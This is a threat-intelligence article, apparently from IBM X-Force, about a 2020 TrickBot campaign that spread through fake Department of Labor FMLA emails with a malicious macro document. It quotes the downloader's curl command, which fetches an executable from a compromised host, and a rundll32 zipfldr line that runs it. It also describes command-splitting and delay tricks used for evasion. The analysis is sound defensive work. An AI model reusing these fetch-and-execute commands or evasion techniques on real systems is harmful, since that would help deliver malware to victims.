# Reference for threat actor for "Wizard Spider, Gold Blackburn"

**Title**: TrickBot Campaigns Targeting Users via Department of Labor FMLA Spam

**Source**: https://securityintelligence.com/posts/trickbot-campaigns-targeting-users-via-department-of-labor-fmla-spam/

## Content




 

TrickBot Campaigns Targeting Users via Department of Labor FMLA Spam












































































































Security Intelligence 





News
Series
Topics
X-Force
Podcast






News
Series
Topics
Threat Research
Podcast











Search
























Application Security
Artificial Intelligence
CISO
Cloud Security
Data Protection
Endpoint


Fraud Protection
Identity & Access
Incident Response
Mainframe
Network
Risk Management


Intelligence & Analytics
Security Services
Threat Hunting
Zero Trust
Infographic: Zero trust policy
Timeline: Local Government Cyberattacks


Industries
Banking & Finance
Energy & Utility
Government
Healthcare




View All Topics































News
Series




Topics


All Categories
Application Security
Identity & Access
Artificial Intelligence
Incident Response
CISO
Mainframe
Cloud Security
Mobile Security
Data Protection
Network
Endpoint
Risk Management
Fraud Protection
Threat Hunting
Security Services
Security Intelligence & Analytics


Industries
Banking & Finance
Energy & Utility
Government
Healthcare




X-Force
Podcast








































TrickBot Campaigns Targeting Users via Department of Labor FMLA Spam 








 





Light
Dark






April 30, 2020
By Ashkan Vila



David Bryant

Limor Kessem


  4 min read




Malware
Threat Intelligence














 


IBM X-Force monitors billions of spam emails a year, mapping trending, malicious campaigns and their origins. Recent analysis from our spam traps uncovered a new Trickbot campaign that currently targets email recipients with fake messages purporting to come from the U.S. Department of Labor (DoL). The spam leverages the Family and Medical Leave Act (FMLA), which gives employees the right to medical leave benefits, as context around COVID-19 in order to distribute the malware.

Figure 1: Fake FMLA-themed email distributing malicious payloads
TrickBot is a sophisticated banking Trojan operated by an organized cybercrime gang. Users infected with the TrickBot Trojan will see their device become part of a botnet that can allow attackers to gain complete control of the device. Typical consequences of TrickBot infections are bank account takeover, high-value wire fraud, and possibly ransomware attacks targeting organizational networks. TrickBot is not limited to these types of attacks and X-Force has been seeing it dabble in additional cybercrime endeavors in the recent past, specifically teaming up with ITG08, known as FIN6, to carry out financially motivated attacks on the retail sector.
Spam purporting to come from official and government entities has been increasing considerably during the COVID-19 pandemic, with cybercriminals developing spam to match trending news, developments, merchandise and initiatives surrounding the outbreak as a means to deliver unsolicited emails that attract recipients to open and launch attachments.
DocuSign-Themed Maldocs and Malicious Macros
The email sample we started with, US-DoL.eml, contains three attachments: us-logo.png, faq.png and Family and Medical Leave of Act 22.04.doc. The .PNG files are benign image files that are visible in the HTML version of the email and contain a DoL logo and FAQ | CONTACT US, respectively. The document file is the malicious component.
Malicious document files are one of the most popular ways for cybercriminals to distribute malware. In the spam samples we looked at, the eventual TrickBot payload started out in a DocuSign-type attachment titled Family and Medical Leave of Act 22.04.doc. Once opened, the document asks the recipient to enable macros (ThisDocument.cls), from which, upon closing the file, malicious scripts will be launched to fetch the malware from the attacker’s designated domain.
The macro begins by creating a local directory, C:\Test, and drops a batch file, terop.bat, to that location. It then executes that file: C:\Test\terop.bat.
Overall, the following files are used in the infection chain:



File Name
File Category
File Hash
Parent


US-DoL.eml
Email
f481ba37fdcfaee9fa991e203963bad8
N/A


Family and Medical Leave of Act 22.04.doc
Carrier File
d341215eb15167870aeff64d5380a69b
US-DoL.eml


terop.bat
Downloader
9f52f07856cdf2b076c27ae60cb0d100
Family and Medical Leave of Act 22.04.doc


faq.png
Benign
eb77c6a9fc86bd73d77b92c24ca889db
US-DoL.eml


us-logo.png
Benign
1af19e6717acf7f38b8f1a651c738954
US-DoL.eml


Scroll to view full table 
Terop.bat
The primary purpose of terop.bat is to download a PE file and execute it using the following commands:
curl https[:]//www[.]omegasystemsuae[.]com/9hfudnsfl.exe –output %appdata%/Bio_Tecs.exe rundll32.exe, zipfldr.dll,RouteTheCall %appdata%\Bio_Tecs.exe 
Some of the commands are broken up using the following technique:
TI^
ME^
OUT ^
Terop.bat contains TIMEOUT /T 30 and ping 8.8.8.8 commands to evade detection and delay execution.
Next, a route is added with the following command:
add 10.0.0.0 mask 255.0.0.0 10.35.8.1 -p.
This route appears to be needed for testing. The pathname, C:\Test, which terop.bat is initially written to, may suggest that this downloader is still being tested by those distributing the malware, which could explain some failures to fetch the final stage payload down the line.
Using the cURL utility, the terop.bat file attempts to download an executable from what appears to be a hijacked or compromised domain: hxxps://www.omegasystemsuae[.]com/9hfudnsfl.exe
The file is set to be written to %APPDATA%\Bio_Tecs.exe. However, since cURL is not available as part of a standard Windows deployment and it was not dropped by the malicious macro, that command ultimately failed and did not actually download the file.
Zipfldr.dll
zipfldr.dll is a standard Windows dynamic link library (DLL) that can be used as an alternate way to execute PE files using the exported function RouteTheCall. This command also fails due to the file not being downloaded nor written to the designated location that was set at %APPDATA%\Bio_Tecs.exe by a cURL command.
Robocopy.exe
Another executable file that takes part in the overall infection routine is named Robocopy.exe. This file is used to move some files as well; however, during our analysis we noticed there was an issue that prevented the macro from writing the command to the batch file and the variables were not expanded. That also caused issues with string concatenation, which resulted in the command failing when the batch file was executed:
robocopy ” & sSource & ” /e /z /s ” & sPath & ” D:\Files E:\Backup ” & sFile
Is It TrickBot?
Without the actual payload, is it TrickBot or another malware? Based on observation of similar patterns in previous TrickBot campaigns, the “Macro on Close” function followed by the DocuSign theme has been a tactic used by this malware’s distributors. Another link to TrickBot is an IP address, 198.72.111.141, also previously linked with hosting TrickBot campaigns.
It is possible that malware is being distributed by the same parties and the final payload is possibly different, but TrickBot mostly uses the same distribution channels compared to more commercialized malware.
Endless COVID-19-Themed Spam Continues to Deliver Malware
As the COVID-19 pandemic continues to hold the attention of people everywhere in an unprecedented manner, we are sure to continue seeing the use of this theme in endless amounts of spam and attacks targeting users across the globe.
The current spam is likely an early warning to those expecting to take advantage of the FMLA during the pandemic to be on the lookout for malicious campaigns. TrickBot spam varies frequently depending on those distributing it, and the issues we detected in the macro scripts are likely to be fixed and relaunched in further spamming activity.
TrickBot is one of the leading and most sophisticated banking Trojans active in the wild this year. It is involved in high-stakes bank fraud, ransomware attacks and big game hunting activity that targets organizations around the globe.
Get indicators of compromise (IoCs) for this campaign on X-Force Exchange, and follow our collections on emerging threat intelligence to keep up to date about trending campaigns.


Banking Trojan | Cybercrime | Fraud | Macros | Malware | Malware Analysis | Social Engineering | Spam | Spam Emails | Spoofing | Threat Intelligence | TrickBot | Trojan | X-Force




Ashkan Vila
Security Analyst – IBM





David Bryant
Malware Reverse Engineer





Limor Kessem
Principal Consultant, X-Force Cyber Crisis Management, IBM






Continue Reading






POPULAR




 









                              Artificial Intelligence  
                        


                        February 1, 2024                  


Audio-jacking: Using generative AI to distort live audio transactions

  7 min read - While the evolution of LLMs mark a new era of AI, we must be mindful that new technologies come with new risks. Explore one such risk called "audio-jacking."                        






 









                              Risk Management  
                        


                        January 9, 2024                  


Cybersecurity trends: IBM’s predictions for 2024

  6 min read - As organizations begin planning their cybersecurity strategies for 2024, these expert insights provide guidance on facing the year to come.                        






 









                              Risk Management  
                        


                        February 7, 2024                  


Back to basics: Better security in the AI era

  4 min read - The rise of artificial intelligence (AI), large language models (LLM) and IoT solutions has created a new security landscape. From generative AI tools that can be taught to create malicious code to the exploitation of connected devices as a way…                        
























More from Malware
















                        October 30, 2023                    





                            Hive0051’s large scale malicious operations enabled by synchronized multi-channel DNS fluxing                        

  12 min read - For the last year and a half, IBM X-Force has actively monitored the evolution of Hive0051’s malware capabilities. This Russian threat actor has accelerated its development efforts to support expanding operations since the onset of the Ukraine conflict. Recent analysis identified three key changes to capabilities: an improved multi-channel approach to DNS fluxing, obfuscated multi-stage scripts, and the use of fileless PowerShell variants of the Gamma malware. As of October 2023, IBM X-Force has also observed a significant increase in…                        



















                        September 7, 2023                    





                            New Hive0117 phishing campaign imitates conscription summons to deliver DarkWatchman malware                        

  8 min read - IBM X-Force uncovered a new phishing campaign likely conducted by Hive0117 delivering the fileless malware DarkWatchman, directed at individuals associated with major energy, finance, transport, and software security industries based in Russia, Kazakhstan, Latvia, and Estonia. DarkWatchman malware is capable of keylogging, collecting system information, and deploying secondary payloads. Imitating official correspondence from the Russian government in phishing emails aligns with previous Hive0117 campaigns delivering DarkWatchman malware, and shows a possible significant effort to induce a sense of urgency as…                        



















                        June 6, 2023                    





                            ITG10 likely targeting South Korean entities of interest to the Democratic People’s Republic of Korea (DPRK)                        

  7 min read - In late April 2023, IBM Security X-Force uncovered documents that are most likely part of a phishing campaign mimicking credible senders, orchestrated by a group X-Force refers to as ITG10, and aimed at delivering RokRAT malware, similar to what has been observed by others. ITG10's tactics, techniques and procedures (TTPs) overlap with APT37 and ScarCruft. The initial delivery method is conducted via a LNK file, which drops two Windows shortcut files containing obfuscated PowerShell scripts in charge of downloading a…                        















Topic updates



                                    Get email updates and stay ahead of the latest threats to the security landscape, thought leadership and research.
                                    


                                                Subscribe today
                                          

















Analysis and insights from hundreds of the brightest minds in the cybersecurity industry to help you prove compliance, grow business and stop threats.



Cybersecurity News
By Topic
By Industry
Exclusive Series
X-Force
Podcast
Events
Contact
About Us



Follow us on social

























© 2024 IBM
Contact
Privacy
Terms of use
Accessibility
Cookie Preferences




Sponsored by
                                          



si-icon-eightbarfeature














